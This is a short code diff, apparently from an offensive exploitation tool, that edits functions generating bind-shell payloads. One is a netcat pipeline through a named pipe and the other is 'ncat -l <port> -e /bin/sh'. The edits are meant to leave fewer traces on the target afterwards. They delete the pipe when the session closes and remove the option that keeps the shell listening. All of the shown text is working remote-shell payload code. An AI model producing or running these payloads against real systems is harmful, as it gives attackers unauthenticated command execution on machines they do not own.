@@ -42,7 +42,9 @@ def _netcat_bind_shell(nc_alternative, use_dash_e=True):
     + nc_alternative
     + " -l -p "
     + settings.LPORT
-    + " 1>" + tmp_fifo + "\""
+    # Taken away again when the pipeline ends, not only before it starts - cleared on the way in
+    # alone, the pipe is left on the target for good once the session closes.
+    + " 1>" + tmp_fifo + ";rm -f " + tmp_fifo + "\""
   )
 
 """
@@ -108,7 +110,9 @@ def gen_socat_bind():
 Ncat bind TCP shell.
 """
 def gen_ncat_bind():
-  return "ncat -k -l " + settings.LPORT + " -e /bin/sh"
+  # Without '-k', as every other bind payload here: kept listening, it leaves an unauthenticated
+  # shell open on the target after the session that asked for it has ended.
+  return "ncat -l " + settings.LPORT + " -e /bin/sh"
 
 """
 PHP meterpreter bind TCP shell (via msfvenom).
